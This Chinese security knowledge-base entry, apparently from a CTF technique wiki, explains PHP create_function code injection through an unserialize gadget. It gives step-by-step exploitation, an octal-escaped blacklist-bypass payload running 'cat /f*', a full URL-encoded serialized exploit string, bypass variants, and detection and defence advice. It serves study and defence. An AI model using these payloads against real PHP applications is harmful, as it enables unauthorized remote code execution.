---
id: web-php-rce-create-function-callback-gadget
title: PHP create_function 回调点代码注入：} 闭合函数体并用八进制转义绕过黑名单
type: scenario
domain: web
path: web/php/rce
technique: php-create-function-code-injection
tags:
- php
- rce
- create-function
- deserialization
- code-injection
- octal-escape
- blacklist-bypass
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: PHP < 8（create_function 在 PHP 8.0 移除；原文环境 PHP 7.1.30）
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:33:39+08:00'
  notes: 已对照原文与图20-21核对：源码 FLAG 类 __destruct 的 $a("", $b) 动态调用、check() 双重黑名单、PHP 7.1.30 环境、payload }"\163\171\163\164\145\155"("\143\141\164\40\57\146\52");// 与回显均一致。affected_versions "PHP < 8" 保留（原文明确 create_function 在 8.0 移除，复现为 7.1.30）。PoC 未在本机执行。
url: /docs/web/php/rce/web-php-rce-create-function-callback-gadget/
draft: false
kb_aliases:
- create_function 代码注入
- 反序列化 create_function gadget
- 八进制转义绕过黑名单
- 闭合函数体注入
- PHP 7 create_function RCE
---

## 一句话结论

反序列化对象的析构函数执行 `$a("", $b)` 且 `$a` 可控时，把 `$a` 设为 `create_function`、`$b` 设为 `}system(...);//`，就能让 `create_function` 拼出的匿名函数体被提前闭合并执行任意代码；黑名单只查字面量时，用八进制转义写函数名和命令即可绕过。

## 原理

- `create_function($args, $code)` 在 PHP 7 及以前会拼出 `function lambda_func($args) { $code }` 并 `eval`。它本质上是一个代码执行 sink。
- 目标类的 `__destruct()` 中：
  ```php
  $a = (string)$this->a;
  $b = (string)$this->b;
  if ($this->check($a, $b)) { $a("", $b); }
  ```
  当 `$a = "create_function"` 时，动态调用等价于 `create_function("", $b)`。
- `$b` 以 `}` 开头，先闭合 `function lambda_func() {` 的函数体；随后写 `system("cat /f*");` 执行命令；最后 `//` 注释掉 `create_function` 自动补上的尾部 `}`，避免语法错误。
- `check()` 用 `preg_match` 对 `$a`、`$b` 做子串黑名单（`system`、`cat`、`flag`、`s`、`e` 等），但黑名单只匹配明文。把 `system` 写成八进制转义 `"\163\171\163\164\145\155"`、`cat /f*` 写成 `"\143\141\164\40\57\146\52"`，字符串里没有禁用子串；PHP 解析双引号字符串时再把八进制还原成命令。
- 因为 `create_function` 在 PHP 8.0 被移除，本链要求目标为 PHP 7.x（原文 7.1.30）。

## 触发条件

- 存在未过滤的 `unserialize()` 入口，且可构造对象的属性；
- 可用类的 `__destruct` 或其他魔术方法把可控字符串当作函数名调用（`$a(...)`），且 `$a` 能设为 `create_function`；
- 目标 PHP 版本 < 8（`create_function` 存在）；
- 黑名单只做字面量子串匹配，没有做字符串转义还原或 AST 检查。

## 利用步骤

1. 审计类，找 `__destruct`/`__wakeup` 中把属性当函数名调用的位置，确认 `$a("", $b)` 形态。
2. 确认 PHP 版本：`create_function` 在 7.x 可用，8.x 已移除；可通过响应头、报错或 `phpinfo` 判断。
3. 构造属性：`a = "create_function"`；`b = '}"\163\171\163\164\145\155"("\143\141\164\40\57\146\52");//'`。
4. 序列化对象并通过入口提交；析构时 `check()` 通过，`create_function` 执行拼接后的代码。
5. 观察响应中的命令输出；如需读 flag，把命令换成 `cat /flag` 的八进制形式。

## PoC

payload 中的关键字符串（PHP 源码形态）：

```php
$a = "create_function";
$b = '}"\163\171\163\164\145\155"("\143\141\164\40\57\146\52");//';
```

`create_function("", $b)` 拼出的代码：

```php
function lambda_func() { }"system"("cat /f*");// }
```

序列化并 URL 编码后提交（示意）：

```text
?exp=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A59%3A%22%7D%22%5C163%5C171%5C163%5C164%5C145%5C155%22%28%22%5C143%5C141%5C164%5C40%5C57%5C146%5C52%22%29%3B%2F%2F%22%3B%7D
```

成功标志：响应回显 `cat /f*` 的结果或 flag。

## 变体与关联

- 变体：把 `system` 换成 `assert`（PHP 7）、`preg_replace` 的 `/e` 修饰符、`call_user_func`、`array_map` 等动态执行点。
- 变体：八进制换成十六进制 `\x73\x79...`、字符串拼接 `"sys"."tem"`、`base64_decode`、`chr()` 组合，绕过不同黑名单。
- 关联：[[web-php-rce-eval-expression-closing-paren-injection]]（同为闭合语法结构后注入代码）；[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（同为动态函数名/字符串变形绕过）。
- 边界：PHP 8+ 无 `create_function`；若 `check()` 先对字符串做反转义或 AST 分析，八进制绕过失效；若析构函数不执行动态调用，链不成立。

## 检测与防御

- 检测：反序列化数据中出现 `create_function`、`assert`、`preg_replace` 等危险回调名；字符串中出现大量 `\1xx` 八进制转义并与函数调用组合。
- 检测：`__destruct` 中出现 `$a("", $b)` 这类动态调用；错误日志出现 `create_function`。
- 防御：升级到 PHP 8+；禁止使用 `create_function`；不要对用户数据反序列化，使用 `allowed_classes` 白名单或 JSON。
- 加固：黑名单改为 AST/语义分析并先做转义还原；`disable_functions` 覆盖 `create_function`、`assert`、`eval` 相关能力；最小权限运行。
